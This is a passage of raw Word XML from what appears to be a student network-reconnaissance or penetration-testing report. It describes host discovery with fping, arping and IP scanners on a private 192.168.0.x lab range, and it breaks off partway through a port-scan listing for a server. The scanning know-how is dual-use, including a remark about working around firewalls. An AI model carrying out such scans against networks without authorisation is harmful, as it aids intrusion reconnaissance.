                            <w:r w:rsidRPr="00B97061">
                              <w:rPr>
                                <w:sz w:val="18"/>
                              </w:rPr>
                              <w:t>192.168.0.1 to 192.168.0.10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1BCACC" id="_x0000_s1039" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:75.85pt;margin-top:89.95pt;width:312.75pt;height:20.65pt;z-index:251700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" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="48C8D042" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="00B97061">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">Fig </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">14 fping was used to check all the ips from </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00B97061">
                        <w:rPr>
                          <w:sz w:val="18"/>
                        </w:rPr>
                        <w:t>192.168.0.1 to 192.168.0.10</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00F901F4">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="445DCA90" wp14:editId="5D30D40C">
            <wp:extent cx="4632960" cy="10858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5730" t="32795" r="21726" b="49478"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4632960" cy="1085850"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2349C490" w14:textId="77777777" w:rsidR="00B97061" w:rsidRDefault="00B97061" w:rsidP="00F901F4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1089" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6006903E" w14:textId="77777777" w:rsidR="00490BAF" w:rsidRPr="00490BAF" w:rsidRDefault="00490BAF" w:rsidP="00490BAF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The Arp-ping tool was used to work around any firewalls that may be present in the network by running a scan against </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">192.168.0.1 to </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>192.168.0.10</w:t>
      </w:r>
      <w:r w:rsidR="00B97061">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B97061">
        <w:t xml:space="preserve"> see</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00B97061">
        <w:t xml:space="preserve"> fig 15</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76D882BF" w14:textId="77777777" w:rsidR="00490BAF" w:rsidRDefault="00B97061" w:rsidP="00490BAF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1089" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r w:rsidRPr="00B97061">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251702272" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="3543B31E" wp14:editId="013B48D0">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>921715</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>1572336</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="3971925" cy="262255"/>
                <wp:effectExtent l="0" t="0" r="9525" b="4445"/>
                <wp:wrapTopAndBottom/>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1925" cy="262255"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="6A4D95DF" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="00B97061">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">Fig </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t>15 arping was used against 192.168.0.1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43B31E" id="_x0000_s1040" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:72.6pt;margin-top:123.8pt;width:312.75pt;height:20.65pt;z-index:25170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" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="6A4D95DF" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="00B97061">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">Fig </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t>15 arping was used against 192.168.0.1</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00490BAF">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5A650EE8" wp14:editId="71F9AEB9">
            <wp:extent cx="4654080" cy="14668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1937" t="22454" r="35353" b="53614"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4669717" cy="1471778"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B1CCCA0" w14:textId="77777777" w:rsidR="00490BAF" w:rsidRDefault="00490BAF" w:rsidP="00F901F4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1089" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4AE2FE0D" w14:textId="77777777" w:rsidR="00B97061" w:rsidRDefault="00B97061" w:rsidP="00F901F4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1089" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0139102B" w14:textId="77777777" w:rsidR="008561E4" w:rsidRDefault="008D6F9E" w:rsidP="00261D49">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>Angry IP scanner found what was turned on within the network</w:t>
      </w:r>
      <w:r w:rsidR="00F901F4">
        <w:t xml:space="preserve">, by scanning </w:t>
      </w:r>
      <w:r w:rsidR="00F901F4">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>192.168.0.1 to 192.168.0.10</w:t>
      </w:r>
      <w:r w:rsidR="004B7E63">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="004B7E63" w:rsidRPr="004B7E63">
        <w:t>see fig 16</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="052DF420" w14:textId="77777777" w:rsidR="008D6F9E" w:rsidRDefault="00F901F4" w:rsidP="008D6F9E">
      <w:pPr>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251660288" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="12B0EFB6" wp14:editId="28E8E060">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>125095</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="3259455" cy="1040765"/>
            <wp:effectExtent l="0" t="0" r="0" b="698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5273" t="25975" r="58243" b="53257"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3259455" cy="1040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FB3370" w14:textId="77777777" w:rsidR="00490BAF" w:rsidRDefault="00490BAF" w:rsidP="00490BAF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1428" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15F11D6C" w14:textId="77777777" w:rsidR="00490BAF" w:rsidRDefault="00490BAF" w:rsidP="00490BAF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1428" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E0288A2" w14:textId="77777777" w:rsidR="00490BAF" w:rsidRDefault="00490BAF" w:rsidP="00490BAF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1428" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="224084DF" w14:textId="77777777" w:rsidR="00490BAF" w:rsidRPr="00190C8A" w:rsidRDefault="00490BAF" w:rsidP="00190C8A">
      <w:pPr>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20362692" w14:textId="77777777" w:rsidR="00490BAF" w:rsidRDefault="004B7E63" w:rsidP="00490BAF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1089" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r w:rsidRPr="004B7E63">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251704320" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="08F492C1" wp14:editId="29AE9B5B">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:align>center</wp:align>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>397790</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="3971925" cy="262255"/>
                <wp:effectExtent l="0" t="0" r="9525" b="4445"/>
                <wp:wrapTopAndBottom/>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1925" cy="262255"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="444F533A" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="004B7E63">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00E15F8D">
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">Fig </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="18"/>
                                <w:szCs w:val="18"/>
                              </w:rPr>
                              <w:t xml:space="preserve">16 angry ip scanner being used to the target network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F492C1" id="_x0000_s1041" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:0;margin-top:31.3pt;width:312.75pt;height:20.65pt;z-index:2517043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" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="444F533A" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00E15F8D" w:rsidRDefault="00B00D47" w:rsidP="004B7E63">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00E15F8D">
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">Fig </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                        <w:t xml:space="preserve">16 angry ip scanner being used to the target network </w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="5872746C" w14:textId="77777777" w:rsidR="004B7E63" w:rsidRDefault="004B7E63" w:rsidP="00490BAF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1089" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39E934B7" w14:textId="77777777" w:rsidR="004B7E63" w:rsidRDefault="004B7E63" w:rsidP="00490BAF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1089" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="42983662" w14:textId="77777777" w:rsidR="00190C8A" w:rsidRDefault="00190C8A" w:rsidP="00490BAF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1089" w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="646B28A3" w14:textId="77777777" w:rsidR="008D6F9E" w:rsidRDefault="00190C8A" w:rsidP="00190C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">An </w:t>
      </w:r>
      <w:r w:rsidR="00A0250F">
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:t>dvanced</w:t>
      </w:r>
      <w:r w:rsidR="008D6F9E">
        <w:t xml:space="preserve"> IP scan</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> was run against</w:t>
      </w:r>
      <w:r w:rsidR="008D6F9E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="008D6F9E" w:rsidRPr="00743EC1">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>192.168.0.1</w:t>
      </w:r>
      <w:r w:rsidR="008D6F9E">
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E02E9A6" w14:textId="77777777" w:rsidR="00190C8A" w:rsidRDefault="00190C8A" w:rsidP="00190C8A">
      <w:pPr>
        <w:spacing w:after="0" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50CA8FD9" w14:textId="77777777" w:rsidR="008D6F9E" w:rsidRPr="008D6F9E" w:rsidRDefault="008D6F9E" w:rsidP="00190C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="1428"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6F9E">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Computers count=10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05FD4C21" w14:textId="77777777" w:rsidR="008D6F9E" w:rsidRPr="008D6F9E" w:rsidRDefault="008D6F9E" w:rsidP="00190C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="1428"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6F9E">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Computer number: 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="615E4EBA" w14:textId="77777777" w:rsidR="008D6F9E" w:rsidRPr="008D6F9E" w:rsidRDefault="008D6F9E" w:rsidP="00190C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="1428"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6F9E">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Name: Server1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79FF0D02" w14:textId="77777777" w:rsidR="008D6F9E" w:rsidRPr="008D6F9E" w:rsidRDefault="008D6F9E" w:rsidP="00190C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="1428"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6F9E">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>IP address: 192.168.0.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48A304F4" w14:textId="77777777" w:rsidR="008D6F9E" w:rsidRPr="008D6F9E" w:rsidRDefault="008D6F9E" w:rsidP="00190C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="1428"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6F9E">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">Ports </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D6F9E">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>( 67</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D6F9E">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve"> scanned, 10 opened, 57 closed )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3101EEF7" w14:textId="77777777" w:rsidR="008D6F9E" w:rsidRPr="008D6F9E" w:rsidRDefault="008D6F9E" w:rsidP="00190C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="1428"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6F9E">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="323949E8" w14:textId="77777777" w:rsidR="008D6F9E" w:rsidRPr="008D6F9E" w:rsidRDefault="008D6F9E" w:rsidP="00190C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="1428"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6F9E">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Port 23 - open</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AD50A65" w14:textId="77777777" w:rsidR="008D6F9E" w:rsidRPr="008D6F9E" w:rsidRDefault="008D6F9E" w:rsidP="00190C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="1428"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6F9E">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>Port 25 - open</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39FC989D" w14:textId="77777777" w:rsidR="008D6F9E" w:rsidRPr="008D6F9E" w:rsidRDefault="008D6F9E" w:rsidP="00190C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="1428"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6F9E">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>Port 53 - open</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A77834C" w14:textId="77777777" w:rsidR="008D6F9E" w:rsidRPr="008D6F9E" w:rsidRDefault="008D6F9E" w:rsidP="00190C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="1428"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6F9E">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>Port 79 - open</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45F4C04B" w14:textId="77777777" w:rsidR="008D6F9E" w:rsidRPr="008D6F9E" w:rsidRDefault="008D6F9E" w:rsidP="00190C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="1428"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6F9E">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>Port 80 - open</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5981D43D" w14:textId="77777777" w:rsidR="008D6F9E" w:rsidRPr="008D6F9E" w:rsidRDefault="008D6F9E" w:rsidP="00190C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="1428"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6F9E">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>Port 88 - open</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64B7FD94" w14:textId="77777777" w:rsidR="008D6F9E" w:rsidRPr="008D6F9E" w:rsidRDefault="008D6F9E" w:rsidP="00190C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="1428"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6F9E">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0187F34E" w14:textId="77777777" w:rsidR="008D6F9E" w:rsidRPr="008D6F9E" w:rsidRDefault="008D6F9E" w:rsidP="00190C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="1428"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6F9E">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Port 110 - open</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="578DB753" w14:textId="77777777" w:rsidR="008D6F9E" w:rsidRPr="008D6F9E" w:rsidRDefault="008D6F9E" w:rsidP="00190C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="1428"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6F9E">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>Port 135 - open</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72BEC9A3" w14:textId="77777777" w:rsidR="008D6F9E" w:rsidRPr="008D6F9E" w:rsidRDefault="008D6F9E" w:rsidP="00190C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="1428"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6F9E">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t>Port 139 - open</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C4A5965" w14:textId="77777777" w:rsidR="008D6F9E" w:rsidRPr="008D6F9E" w:rsidRDefault="008D6F9E" w:rsidP="00190C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="1428"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D6F9E">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">Port 445 - </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B542FCF" w14:textId="77777777" w:rsidR="008D6F9E" w:rsidRPr="008D6F9E" w:rsidRDefault="008D6F9E" w:rsidP="00190C8A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="0"/>
